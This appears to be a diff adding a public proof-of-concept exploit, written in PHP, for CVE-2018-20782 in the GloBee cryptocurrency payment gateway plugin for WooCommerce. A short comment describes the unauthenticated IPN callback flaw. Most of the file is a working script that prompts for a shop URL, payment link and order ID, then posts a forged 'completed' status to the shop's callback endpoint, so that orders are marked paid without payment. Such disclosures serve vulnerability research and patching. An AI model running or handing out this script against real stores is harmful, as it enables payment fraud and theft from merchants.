@@ -1,0 +1,93 @@
+<?php
+# Exploit Title: WordPress WooCommerce - GloBee (cryptocurrency) Payment Gateway Plugin [Payment Bypass / Unauthorized Order Status Spoofing]
+# Discovery Date: 14.12.2018
+# Public Disclosure Date: 14.02.2019
+# Exploit Author: GeekHack
+# Contact: https://t.me/GeekHack
+# Vendor Homepage: https://globee.com/ (previously payb.ee)
+# Software Link: https://github.com/GloBee-Official/woocommerce-payment-api-plugin/releases/tag/v1.1.1
+# Version: <= 1.1.1
+# Tested on: WordPress 4.9.9 + WooCommerce 3.5.1 + GloBee Payment Gateway Plugin 1.1.1
+# CVE: CVE-2018-20782
+
+/*
+  Description:
+
+  Reliance on untrusted inputs (CWE-807), insufficient data verification and lack of any cryptographic authentication (hmac etc) at IPN callback (ipn_callback() function in Gateway.php at 374 line) allow remote (even unauthorized) attacker to bypass payment process and spoof real order status without actually paying for it.
+
+  [code ref: https://github.com/GloBee-Official/woocommerce-payment-api-plugin/blob/8c254d6100ef4cfb3432b219726f4936c1531234/src/Gateway.php#L374]
+
+  Such actions like 'changin order status' normally require administrative rights. But in this case anyone can perform these actions, even with the most limited rights, therefor this issue "can" also be considered as a Privilege Escalation (CWE-269) vulnerability (but it's not quite right, imho).
+*/
+
+if(php_sapi_name() !== 'cli')
+	die('Use CLI: php '.__FILE__);
+if(!extension_loaded('curl'))
+	die('cURL extension is required');
+
+echo 'Payment Bypass (CVE-2018-20782) PoC by GeekHack team.'."\n";
+echo 'Select any product(s) in a vulnerable store and continue checkout through payment via cryptocurrencies (GloBee Payment Gateway).'."\n\n";
+
+$shopURL = rtrim(readline('Shop root URL (https://shop.example.com/): '), '/');
+if(strpos(@get_headers($shopURL)[0], '200') === false)
+	die('Shop url is invalid or not exists (or request was blocked), check link format and try again.');
+$paymentLink = readline('Payment link (https://globee.com/en/payment-request/XXXXXXXXXXXXXXXXXXXXXX): ');
+if(preg_match('/https:\/\/globee\.com\/en\/payment-request\/(\w*)/', $paymentLink, $matches)) {
+	$paymentID = $matches[1];
+}else{
+	die('Payment link is invalid, check link format and try again.');
+}
+$orderID = (int)readline('Order ID: ');
+if(!$orderID)
+	die('Order ID is invalid, must be a positive integer, try again.');
+
+$payload = [ // commented fields are not required for exploitation
+	'id' => $paymentID,
+	'status' => 'completed',
+	//'total' => '123.45',
+	//'currency' => "USD",
+	'custom_payment_id' => $orderID,
+	//'callback_data' => "example data",
+	/*'customer' => [
+		'name' => 'John Smit',
+		'email' => 'john.smit@hotmail.com'
+	],*/
+	/*'payment_details' => [
+		'currency' => 'BTC'
+	],*/
+	//'redirect_url' => 'http://globee.com/invoice/'.$paymentID,
+	//'success_url' => $shopURL,
+	//'cancel_url' => $shopURL,
+	//'ipn_url' => $shopURL.'/wc-api/globee_ipn_callback',
+	//'notification_email' => null,
+	//'confirmation_speed' => 'medium',
+	//'expires_at' => '2018-01-25 12:31:04',
+	//'created_at' => '2018-01-25 12:16:04'
+];
+
+$curl = curl_init();
+curl_setopt_array($curl, array(
+	CURLOPT_URL => $shopURL.'/wc-api/globee_ipn_callback',
+	CURLOPT_RETURNTRANSFER => true,
+	CURLOPT_ENCODING => "",
+	CURLOPT_MAXREDIRS => 2,
+	CURLOPT_TIMEOUT => 10,
+	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+	CURLOPT_CUSTOMREQUEST => 'POST',
+	CURLOPT_POSTFIELDS => json_encode($payload),
+	CURLOPT_HTTPHEADER => array(
+		'cache-control: no-cache',
+		'content-type: application/json',
+	),
+));
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+if ($err) {
+	echo 'cURL Error #: '.$err;
+} else {
+	echo 'Done: '.$response;
+}
